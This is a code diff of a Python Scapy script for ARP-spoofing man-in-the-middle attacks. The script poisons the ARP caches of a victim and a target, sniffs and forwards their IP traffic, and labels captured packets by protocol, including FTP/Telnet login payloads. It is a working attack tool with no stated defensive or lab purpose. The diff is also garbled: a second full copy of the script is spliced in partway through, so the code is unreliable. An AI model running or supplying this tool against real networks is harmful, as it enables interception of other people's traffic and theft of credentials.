@@ -3,6 +3,9 @@
 
 import argparse
 from scapy.all import *
+from scapy.all import ARP
+from scapy.all import IP
+from scapy.all import fragment
 import time
 import threading
 import sys
@@ -11,234 +14,285 @@ import signal
 # Global flag to handle graceful termination
 running = True
 
-# Application port mappings
-applicationPorts = {
+def arpSpoof(targetIp, spoofIp, iface):
+    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
+    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
+    while running:
+        send(pkt, iface=iface, verbose=False)
+        time.sleep(1)
+
+def forwardPacket(pkt, victimIp, targetIp, iface):
+     if pkt.haslayer(IP):
+        sendp(pkt, iface=iface, verbose=False)
+
+def sniffAndForward(victimIp, targetIp, iface):
+    print(f"Starting packet sniffing on {iface}")
+    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, victimIp, targetIp, iface), store=0, timeout=None)
+
+def startAttack(victimIp, targetIp, iface, report):
+    # Start ARP poisoning threads
+    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
+    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
+    # Start sniffing and forwarding packets
+    if report == 1:
+        createReport(victimIp, targetIp, iface)
+    else:
+        sniffAndForward(victimIp, targetIp, iface)
+
+def createReport(victimIp, targetIp, iface):
+    applicationPorts = {
     21: "FTP", 22: "SSH", 23: "Telnet",
     25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
     80: "HTTP", 443: "HTTPS", 110: "POP3",
     143: "IMAP", 389: "LDAP", 161: "SNMP",
     3306: "MySQL", 5432: "PostgreSQL"
-}
+    }
 
-def getApplicationProtocol(packet):
-    """Identify application-layer protocols based on ports and payload."""
-    protocols = []
-    if packet.haslayer("TCP") or packet.haslayer("UDP"):
-        sport = packet.sport
-        dport = packet.dport
-        if sport in applicationPorts:
-            protocols.append(applicationPorts[sport])
-        if dport in applicationPorts:
-            protocols.append(applicationPorts[dport])
-    
-    if packet.haslayer("Raw"):
-        payload = packet["Raw"].load.decode(errors="ignore").lower()
-        if any(method in payload for method in ["get ", "post ", "put ", "delete ", "host: "]):
-            protocols.append("HTTP")
-        if "tls" in payload or "ssl" in payload:
-            protocols.append("TLS/SSL")
-        if "220" in payload and "ftp" in payload:
-            protocols.append("FTP")
-        if "ehlo" in payload or "mail from" in payload:
-            protocols.append("SMTP")
-        if "user" in payload and "pass" in payload:
-            protocols.append("Telnet/FTP Login")
-        if "bind" in payload or "query" in payload:
-            protocols.append("DNS Query")
-        if "mysql_native_password" in payload or "handshake" in payload:
-            protocols.append("MySQL")
-        if "postgresql" in payload or "scram-sha-256" in payload:
-            protocols.append("PostgreSQL")
-        if "ldap" in payload or "bindrequest" in payload:
-            protocols.append("LDAP")
-        if "snmp" in payload or "community" in payload:
-            protocols.append("SNMP")
-        if "dhcp" in payload or "discover" in payload:
-            protocols.append("DHCP")
-    
-    return protocols
+    def getApplicationProtocol(packet):
+        protocols = []
+        if packet.haslayer("TCP") or packet.haslayer("UDP"):
+            sport = packet.sport
+            dport = packet.dport
+            if sport in applicationPorts:
+                protocols.append(applicationPorts[sport])
+            if dport in applicationPorts:
+                protocols.append(applicationPorts[dport])
+ 
+        if packet.haslayer("Raw"):
+            payload = packet["Raw"].load.decode(errors="ignore").lower()
+            if any(method in payload for method in ["get ", "post ", "put ", "delete ", "host: "]):
+                protocols.append("HTTP")
+            if "tls" in payload or "ssl" in payload:
+                protocols.append("TLS/SSL")
+            if "220" in payload and "ftp" in payload:
+                protocols.append("FTP")
+            if "ehlo" in payload or "mail from" in payload:
+                protocols.append("SMTP")
+            if "user" in payload and "pass" in payload:
+                protocols.append("Telnet/FTP Login")
+            if "bind" in payload or "query" in payload:
+                protocols.append("DNS Query")
+            if "mysql_native_password" in payload or "handshake" in payload:
+                protocols.append("MySQL")
+            if "postgresql" in payload or "scram-sha-256" in payload:
+                protocols.append("PostgreSQL")
+            if "ldap" in payload or "bindrequest" in payload:
+                protocols.append("LDAP")
+            if "snmp" in payload or "community" in payload:
+                protocols.append("SNMP")
+            if "dhcp" in payload or "discover" in payload:
+                protocols.append("DHCP")
+ 
+        return protocols
+     
+    def packetCallback(packet):
+        if victimIp:
+            if packet.haslayer(IP) and not (packet[IP].src == victimIp or packet[IP].dst == victimIp):
+                return  # Skip packets that don't involve the target IP
 
-def arpSpoof(target, spoofIp, iface):
-    """Send ARP spoof packets to poison the target's ARP cache."""
-    pkt = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
-    print(f"Sending ARP spoof packets to target {target}, impersonating {spoofIp}.")
+        protocols = getApplicationProtocol(packet)
+        if protocols:
+            print(f"Application Layer Protocols: {protocols} | Packet Summary: {packet.summary()}")
+
+    try:
+        print(f"\nSniffing packets involving {victimIp}... Press Ctrl+C to stop and create a report.")
+        time.sleep(1)
+        sniff(iface=iface, filter="ip", prn=lambda pkt: packetCallback(pkt), store=False, timeout=None)
+    except KeyboardInterrupt:
+        print("\nStopping packet sniffing.")
+
+def menu():
+    RED = "\033[38;2;255;0;0m"
+    RESET = "\033[0m"
+    victimIp = input(f"{RED}\nHost IP: {RESET}")
+    targetIp = input(f"{RED}Target IP: {RESET}")
+    interface = input(f"{RED}Interface: {RESET}")
+    while True:
+        report = input("Want to create a report during the attack? [Y]es | [N]o: ")
+        if report.lower() == "y":
+            startAttack(victimIp, targetIp, interface, 1)
+        elif report.lower() == "n":
+            startAttack(victimIp, targetIp, interface, 0)
+            break
+        else:
+            print("Invalid.")
+            
+def terminal():
+    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
+    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
+    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
+    parser.add_argument("-r", "--report", action="store_true", help="Create a report.")
+
+    args = parser.parse_args()
+
+    if args.victimip and args.targetip and args.interface:
+        if args.report:
+            startAttack(args.victimip, args.targetip, args.interface, 1)
+        else:
+            startAttack(args.victimip, args.targetip, args.interface, 0)
+    else:
+        parser.error("Syntax error.")
+
+def signalHandler(sig, frame):
+    global running
+    print("\nGracefully stopping attack...")
+    running = False
+    sys.exit(0)
+
+def main():
+    signal.signal(signal.SIGINT, signalHandler)  
+    if len(sys.argv) > 1:
+        terminal()
+    else:
+        menu()
+
+if __name__ == "__main__":
+    main()
+#!/usr/bin/env python3
+# ARP Spoofing (Man-in-the-middle)
+
+import argparse
+from scapy.all import *
+from scapy.all import ARP
+from scapy.all import IP
+from scapy.all import fragment
+import time
+import threading
+import sys
+import signal
+
+# Global flag to handle graceful termination
+running = True
+
+def arpSpoof(targetIp, spoofIp, iface):
+    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
+    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
     while running:
         send(pkt, iface=iface, verbose=False)
         time.sleep(1)
 
-def forwardPacket(pkt, target1, target2, iface):
-    """Forward packets only between target1 and target2."""
-    if pkt.haslayer(IP):
-        if (pkt[IP].src == target1 and pkt[IP].dst == target2) or \
-           (pkt[IP].src == target2 and pkt[IP].dst == target1):
-            sendp(pkt, iface=iface, verbose=False)
+def forwardPacket(pkt, victimIp, targetIp, iface):
+     if pkt.haslayer(IP):
+        sendp(pkt, iface=iface, verbose=False)
 
-def logPacket(pkt, txt_file):
-    """Log packet details to the text file in CSV format."""
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    src_ip = pkt[IP].src
-    dst_ip = pkt[IP].dst
-    if pkt.haslayer("TCP"):
-        transport = "TCP"
-        sport = pkt["TCP"].sport
-        dport = pkt["TCP"].dport
-    elif pkt.haslayer("UDP"):
-        transport = "UDP"
-        sport = pkt["UDP"].sport
-        dport = pkt["UDP"].dport
-    elif pkt.haslayer("ICMP"):
-        transport = "ICMP"
-        sport = ""
-        dport = ""
+def sniffAndForward(victimIp, targetIp, iface):
+    print(f"Starting packet sniffing on {iface}")
+    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, victimIp, targetIp, iface), store=0, timeout=None)
+
+def startAttack(victimIp, targetIp, iface, report):
+    # Start ARP poisoning threads
+    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
+    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
+    # Start sniffing and forwarding packets
+    if report == 1:
+        createReport(victimIp, targetIp, iface)
     else:
-        transport = "Other"
-        sport = ""
-        dport = ""
-    protocols = getApplicationProtocol(pkt)
-    app_protocols = ",".join(protocols) if protocols else ""
-    line = f"{timestamp},{src_ip},{dst_ip},{transport},{sport},{dport},{app_protocols}\n"
-    txt_file.write(line)
-    txt_file.flush()
+        sniffAndForward(victimIp, targetIp, iface)
 
-def generateHtmlReport(txtFilename):
-    """Generate an HTML report from the text file data."""
-    with open(txtFilename, "r") as txt_file:
-        lines = txt_file.readlines()[1:]  # Skip header
-        total_packets = len(lines)
-        source_ips = set()
-        dest_ips = set()
-        transport_counts = {}
-        app_protocol_counts = {}
-        for line in lines:
-            fields = line.strip().split(",")
-            if len(fields) < 7:
-                continue
-            timestamp, src_ip, dst_ip, transport, sport, dport, app_protocols = fields
-            source_ips.add(src_ip)
-            dest_ips.add(dst_ip)
-            transport_counts[transport] = transport_counts.get(transport, 0) + 1
-            if app_protocols:
-                protocols = app_protocols.split(",")
-                for proto in protocols:
-                    app_protocol_counts[proto] = app_protocol_counts.get(proto, 0) + 1
-        
-        html_content = f"""
-        <html>
-        <head><title>Sniffing Report</title></head>
-        <body>
-        <h1>Sniffing Report</h1>
-        <p>Total packets captured: {total_packets}</p>
-        <p>Unique source IPs: {', '.join(source_ips)}</p>
-        <p>Unique destination IPs: {', '.join(dest_ips)}</p>
-        <h2>Transport Protocol Counts</h2>
-        <ul>
-        """
-        for transport, count in transport_counts.items():
-            html_content += f"<li>{transport}: {count}</li>\n"
-        html_content += "</ul>\n<h2>Application Protocol Counts</h2>\n<ul>\n"
-        for proto, count in app_protocol_counts.items():
-            html_content += f"<li>{proto}: {count}</li>\n"
-        html_content += "</ul>\n</body>\n</html>"
-        
-        with open("report.html", "w") as html_file:
-            html_file.write(html_content)
-        print("HTML report generated: report.html")
+def createReport(victimIp, targetIp, iface):
+    applicationPorts = {
+    21: "FTP", 22: "SSH", 23: "Telnet",
+    25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
+    80: "HTTP", 443: "HTTPS", 110: "POP3",
+    143: "IMAP", 389: "LDAP", 161: "SNMP",
+    3306: "MySQL", 5432: "PostgreSQL"
+    }
 
-def sniffPackets(target1, target2, iface, log=False):
-    """Sniff packets, forward them, display on screen, and optionally log to a text file."""
-    txt_file = None
-    if log:
-        txtFilename = "sniffingData.txt"
-        txt_file = open(txtFilename, "w")
-        txt_file.write("Timestamp,Source IP,Destination IP,Transport Protocol,Source Port,Destination Port,Application Protocols\n")
-        print(f"Starting packet sniffing on {iface} with logging to {txtFilename}")
-    else:
-        print(f"Starting packet sniffing on {iface}")
-    
-    def packetHandler(pkt):
-        if pkt.haslayer(IP):
-            if (pkt[IP].src == target1 and pkt[IP].dst == target2) or \
-               (pkt[IP].src == target2 and pkt[IP].dst == target1):
-                forwardPacket(pkt, target1, target2, iface)
-                if log:
-                    logPacket(pkt, txt_file)
-                # Display packet on screen
-                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-                src_ip = pkt[IP].src
-                dst_ip = pkt[IP].dst
-                transport = "Other"
-                sport = ""
-                dport = ""
-                if pkt.haslayer("TCP"):
-                    transport = "TCP"
-                    sport = pkt["TCP"].sport
-                    dport = pkt["TCP"].dport
-                elif pkt.haslayer("UDP"):
-                    transport = "UDP"
-                    sport = pkt["UDP"].sport
-                    dport = pkt["UDP"].dport
-                elif pkt.haslayer("ICMP"):
-                    transport = "ICMP"
-                protocols = getApplicationProtocol(pkt)
-                app_protocols = ",".join(protocols) if protocols else "None"
-                print(f"{timestamp} - {src_ip}:{sport} -> {dst_ip}:{dport} [{transport}] {app_protocols}")
-    
-    sniffer = AsyncSniffer(iface=iface, filter="ip", prn=packetHandler, store=0)
-    sniffer.start()
+    def getApplicationProtocol(packet):
+        protocols = []
+        if packet.haslayer("TCP") or packet.haslayer("UDP"):
+            sport = packet.sport
+            dport = packet.dport
+            if sport in applicationPorts:
+                protocols.append(applicationPorts[sport])
+            if dport in applicationPorts:
+                protocols.append(applicationPorts[dport])
+ 
+        if packet.haslayer("Raw"):
+            payload = packet["Raw"].load.decode(errors="ignore").lower()
+            if any(method in payload for method in ["get ", "post ", "put ", "delete ", "host: "]):
+                protocols.append("HTTP")
+            if "tls" in payload or "ssl" in payload:
+                protocols.append("TLS/SSL")
+            if "220" in payload and "ftp" in payload:
+                protocols.append("FTP")
+            if "ehlo" in payload or "mail from" in payload:
+                protocols.append("SMTP")
+            if "user" in payload and "pass" in payload:
+                protocols.append("Telnet/FTP Login")
+            if "bind" in payload or "query" in payload:
+                protocols.append("DNS Query")
+            if "mysql_native_password" in payload or "handshake" in payload:
+                protocols.append("MySQL")
+            if "postgresql" in payload or "scram-sha-256" in payload:
+                protocols.append("PostgreSQL")
+            if "ldap" in payload or "bindrequest" in payload:
+                protocols.append("LDAP")
+            if "snmp" in payload or "community" in payload:
+                protocols.append("SNMP")
+            if "dhcp" in payload or "discover" in payload:
+                protocols.append("DHCP")
+ 
+        return protocols
+     
+    def packetCallback(packet):
+        if victimIp:
+            if packet.haslayer(IP) and not (packet[IP].src == victimIp or packet[IP].dst == victimIp):
+                return  # Skip packets that don't involve the target IP
+
+        protocols = getApplicationProtocol(packet)
+        if protocols:
+            print(f"Application Layer Protocols: {protocols} | Packet Summary: {packet.summary()}")
+
     try:
-        while running:
-            time.sleep(1)
+        print(f"\nSniffing packets involving {victimIp}... Press Ctrl+C to stop and create a report.")
+        time.sleep(1)
+        sniff(iface=iface, filter="ip", prn=lambda pkt: packetCallback(pkt), store=False, timeout=None)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
-    finally:
-        sniffer.stop()
-        if txt_file:
-            txt_file.close()
-            if log:
-                generateHtmlReport("sniffingData.txt")
-
-def startAttack(target1, target2, iface, report):
-    """Start the ARP spoofing attack with optional reporting."""
-    threading.Thread(target=arpSpoof, args=(target1, target2, iface), daemon=True).start()
-    threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()
-    sniffPackets(target1, target2, iface, log=report)
 
 def menu():
-    """Interactive menu for user input."""
     RED = "\033[38;2;255;0;0m"
     RESET = "\033[0m"
-    target1 = input(f"{RED}\nTarget 1 IP: {RESET}")
-    target2 = input(f"{RED}Target 2 IP: {RESET}")
+    victimIp = input(f"{RED}\nHost IP: {RESET}")
+    targetIp = input(f"{RED}Target IP: {RESET}")
     interface = input(f"{RED}Interface: {RESET}")
     while True:
-        report_input = input("Want to create a report during the attack? [Y]es | [N]o: ")
-        if report_input.lower() == "y":
-            startAttack(target1, target2, interface, True)
-            break
-        elif report_input.lower() == "n":
-            startAttack(target1, target2, interface, False)
+        report = input("Want to create a report during the attack? [Y]es | [N]o: ")
+        if report.lower() == "y":
+            startAttack(victimIp, targetIp, interface, 1)
+        elif report.lower() == "n":
+            startAttack(victimIp, targetIp, interface, 0)
             break
         else:
-            print("Invalid input. Please enter 'Y' or 'N'.")
-
+            print("Invalid.")
+            
 def terminal():
-    """Handle command-line arguments."""
     parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument("-t1", "--target1", required=True, help="Target 1 IP address.")
-    parser.add_argument("-t2", "--target2", required=True, help="Target 2 IP address.")
+    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
+    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
     parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
     parser.add_argument("-r", "--report", action="store_true", help="Create a report.")
+
     args = parser.parse_args()
-    startAttack(args.target1, args.target2, args.interface, args.report)
+
+    if args.victimip and args.targetip and args.interface:
+        if args.report:
+            startAttack(args.victimip, args.targetip, args.interface, 1)
+        else:
+            startAttack(args.victimip, args.targetip, args.interface, 0)
+    else:
+        parser.error("Syntax error.")
 
 def signalHandler(sig, frame):
-    """Handle Ctrl+C to stop the attack gracefully."""
     global running
     print("\nGracefully stopping attack...")
     running = False
+    sys.exit(0)
 
 def main():
-    signal.signal(signal.SIGINT, signalHandler)
+    signal.signal(signal.SIGINT, signalHandler)  
     if len(sys.argv) > 1:
         terminal()
     else:
